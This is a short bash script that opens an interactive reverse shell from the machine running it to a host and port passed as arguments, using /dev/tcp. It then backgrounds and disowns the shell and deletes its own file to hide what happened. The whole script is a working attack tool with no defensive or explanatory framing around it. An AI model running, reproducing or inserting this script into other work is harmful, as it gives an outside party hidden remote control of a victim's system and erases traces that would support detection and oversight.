#!/bin/bash
A="$0"
H=$1
P=$2
/bin/bash -c /bin/bash -i > /dev/tcp/$H/$P 0<&1 2>&1 &
disown $!
rm -f "$A"
